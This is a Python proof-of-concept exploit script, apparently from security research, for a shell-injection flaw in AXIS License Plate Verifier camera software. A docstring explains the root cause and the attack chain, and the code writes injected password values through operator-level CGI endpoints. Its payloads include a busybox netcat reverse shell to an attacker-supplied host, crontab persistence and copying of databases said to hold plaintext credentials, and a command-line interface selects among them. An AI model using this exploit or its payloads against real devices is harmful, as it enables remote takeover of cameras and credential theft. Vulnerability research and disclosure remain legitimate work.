"""
AXIS-LPV-02: Shell injection via axparameter cloud credential fields in LPV
CONTROLLED ENVIRONMENT ONLY

Affected: AXIS License Plate Verifier (fflprapp) all versions through 3.0.13
          appId 333330, aarch64 ELF, ARTPEC-6/7/8/9

Root cause (confirmed via static analysis of fflprapp binary):

  fflprapp calls popen() or system() with format strings that interpolate
  axparameter values directly into shell commands without sanitization:

    "cp localdata/create_overlay.json /tmp;curl %s -o %s --anyauth -u '%s:%s' "
    "-H \"Content-Type: application/json\" --data @/tmp/create_overlay.json "
    "\"%s://%s/axis-cgi/dynamicoverlay/dynamicoverlay.cgi\""

    "curl %s --anyauth -u '%s:%s' \"%s://%s/axis-cgi/io/port.cgi?action=%d%%3A%s\""
    "curl %s --anyauth -u '%s:%s' \"%s://%s/axis-cgi/virtualinput/activate.cgi?...\""

  The %s slots map to axparameter keys (read by ax_parameter_get()):
    cloud_config/user           → 3rd %s (username field in curl -u 'user:pass')
    cloud_config/password       → 4th %s (password field — executed in shell)
    a91xx_config/ipc_login      → 3rd %s (A91xx integration username)
    a91xx_config/ipc_password   → 4th %s (A91xx integration password — CRITICAL)
    gsc_config/user             → GSC3574 username
    gsc_config/password         → GSC3574 password

  Axparameter keys are writable via:
    config_o.cgi (operator-level) — sets configuration parameters
    api_o.cgi   (operator-level) — JSON API for parameter write

  Injection vector: set cloud_config/password (or a91xx_config/ipc_password) to:
    x';CMD>/tmp/out;DUMMY='
  When the curl command string is passed to popen():
    ... -u 'user:x';CMD>/tmp/out;DUMMY='' ...
  The shell interprets CMD as a separate command, executing as acap-fflprapp process user.

  Chain:
    Operator-level auth → api_o.cgi (write axparameter) → inject shell payload into
    cloud/A91xx password field → trigger cloud integration event → popen() executes →
    command runs as acap-fflprapp → escalate via writable SUID/ACAP paths

  Severity: CRITICAL (operator-level → RCE)
  Process user: acap-fflprapp (ACAP sandbox user; check SUID/capabilities for escalation)

References:
  Binary strings: "curl %s --anyauth -u '%s:%s'" (confirmed in fflprapp)
  Param keys: cloud_config/password, a91xx_config/ipc_password, gsc_config/password
  CGI: api_o.cgi (operator), config_o.cgi (operator)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import base64
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

FINDING = "AXIS-LPV-02"
LABEL = "Shell injection via axparameter cloud credential fields"

# Axparameter keys vulnerable to injection (password fields interpolated into popen())
INJECTABLE_PARAMS = {
    "cloud_password":   "cloud_config/password",
    "a91xx_password":   "a91xx_config/ipc_password",
    "gsc_password":     "gsc_config/password",
    "hb_password":      "hb_config/password",
    "cloud_user":       "cloud_config/user",       # less reliable — appears before password
    "a91xx_user":       "a91xx_config/ipc_login",
}

# API endpoints for parameter write (operator-level)
API_CGI       = "/local/fflprapp/api_o.cgi"
CONFIG_CGI    = "/local/fflprapp/config_o.cgi"

# PoC payloads — write output to writable temp path on camera
# The camera process user is acap-fflprapp; /tmp is typically writable.
POC_PAYLOADS = {
    "canary": "x';echo AXIS_LPV02_RCE_$(id)>/tmp/axis_lpv02_poc;DUMMY='",
    "reverse_shell": "x';busybox nc {lhost} {lport} -e /bin/sh &;DUMMY='",
    "crontab":  "x';echo '* * * * * /bin/sh -c \"id>/tmp/cron_out\"'|crontab -;DUMMY='",
    "read_db":  "x';cp /usr/local/packages/fflprapp/localdata/cfg/*.db /tmp/;DUMMY='",
}


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _basic_auth(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def _post(url: str, body: bytes, content_type: str, auth_header: str, timeout: int = 15) -> dict:
    headers = {
        "Authorization": auth_header,
        "Content-Type": content_type,
    }
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            try:
                return {"status": r.status, "body": json.loads(raw), "ok": True}
            except Exception:
                return {"status": r.status, "body": raw.decode("utf-8", errors="replace"), "ok": True}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode("utf-8", errors="replace"), "ok": False}
    except Exception as e:
        return {"status": None, "body": str(e), "ok": False}


def write_axparameter(
    host: str,
    port: int,
    param_key: str,
    value: str,
    camera_user: str,
    camera_password: str,
    timeout: int = 15,
) -> dict:
    """
    Write an axparameter key via api_o.cgi JSON API (operator-level).

    The api_o.cgi JSON format (inferred from 'api_error', 'apiVersion' strings in binary):
      POST /local/fflprapp/api_o.cgi
      {"method": "set", "params": {"<key>": "<value>"}}

    Falls back to config_o.cgi form POST if JSON API returns non-200.
    """
    url = f"https://{host}:{port}{API_CGI}"
    auth = _basic_auth(camera_user, camera_password)

    # Try JSON API first
    body = json.dumps({"method": "set", "params": {param_key: value}}).encode()
    result = _post(url, body, "application/json", auth, timeout)

    if not result["ok"] or result["status"] not in (200, 204):
        # Fallback: form POST to config_o.cgi
        url2 = f"https://{host}:{port}{CONFIG_CGI}"
        form = urllib.parse.urlencode({param_key: value}).encode()
        result = _post(url2, form, "application/x-www-form-urlencoded", auth, timeout)
        result["method"] = "config_o.cgi (fallback)"
    else:
        result["method"] = "api_o.cgi (JSON)"

    result["param_key"] = param_key
    result["injected_value"] = value
    return result


def inject_canary(
    host: str,
    port: int,
    camera_user: str,
    camera_password: str,
    param: str = "a91xx_password",
    timeout: int = 15,
) -> dict:
    """
    Write canary payload to the specified injectable parameter.
    Trigger is automatic when fflprapp's A91xx/cloud integration fires;
    may need to be accelerated by enabling the integration via config_o.cgi.
    After injection: check /tmp/axis_lpv02_poc on camera for RCE confirmation.
    """
    key = INJECTABLE_PARAMS.get(param)
    if not key:
        raise ValueError(f"Unknown param: {param}. Use: {list(INJECTABLE_PARAMS)}")
    return write_axparameter(host, port, key, POC_PAYLOADS["canary"], camera_user, camera_password, timeout)


def inject_reverse_shell(
    host: str,
    port: int,
    camera_user: str,
    camera_password: str,
    lhost: str,
    lport: int,
    param: str = "a91xx_password",
    timeout: int = 15,
) -> dict:
    """
    Write reverse shell payload. Listener must be running on lhost:lport before trigger.
    """
    key = INJECTABLE_PARAMS.get(param)
    if not key:
        raise ValueError(f"Unknown param: {param}")
    payload = POC_PAYLOADS["reverse_shell"].format(lhost=lhost, lport=lport)
    return write_axparameter(host, port, key, payload, camera_user, camera_password, timeout)


def inject_db_copy(
    host: str,
    port: int,
    camera_user: str,
    camera_password: str,
    param: str = "a91xx_password",
    timeout: int = 15,
) -> dict:
    """
    Copy all LPV SQLite DBs (including CAMERA_BWLIST with plaintext creds) to /tmp/.
    Useful combined with a subsequent directory traversal or log-read primitive.
    """
    key = INJECTABLE_PARAMS.get(param)
    if not key:
        raise ValueError(f"Unknown param: {param}")
    return write_axparameter(host, port, key, POC_PAYLOADS["read_db"], camera_user, camera_password, timeout)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--user", default="root")
    parser.add_argument("--password", required=True)
    parser.add_argument(
        "--param", default="a91xx_password", choices=list(INJECTABLE_PARAMS),
        help="Injectable axparameter to target"
    )
    parser.add_argument(
        "--mode", default="canary",
        choices=["canary", "reverse_shell", "db_copy"],
        help="Exploit mode"
    )
    parser.add_argument("--lhost", help="Listener IP (reverse_shell mode)")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--json", action="store_true", dest="json_out")
    args = parser.parse_args()

    print(f"[{FINDING}] {LABEL}")
    print(f"  Target: https://{args.host}:{args.port}")
    print(f"  Param:  {INJECTABLE_PARAMS[args.param]}")
    print()

    if args.mode == "canary":
        r = inject_canary(args.host, args.port, args.user, args.password, args.param)
        print(f"  Canary written. Check /tmp/axis_lpv02_poc on camera after integration fires.")
    elif args.mode == "reverse_shell":
        if not args.lhost:
            print("ERROR: --lhost required for reverse_shell mode", file=sys.stderr)
            sys.exit(1)
        r = inject_reverse_shell(args.host, args.port, args.user, args.password, args.lhost, args.lport, args.param)
        print(f"  Payload written. Start listener: nc -lvnp {args.lport}")
    elif args.mode == "db_copy":
        r = inject_db_copy(args.host, args.port, args.user, args.password, args.param)
        print(f"  DB copy payload written. DBs will appear in /tmp/ after trigger.")

    if args.json_out:
        print(json.dumps(r, indent=2))
    else:
        print(f"  Write result: HTTP {r['status']} via {r.get('method','?')}")
        print(f"  Body: {str(r['body'])[:200]}")
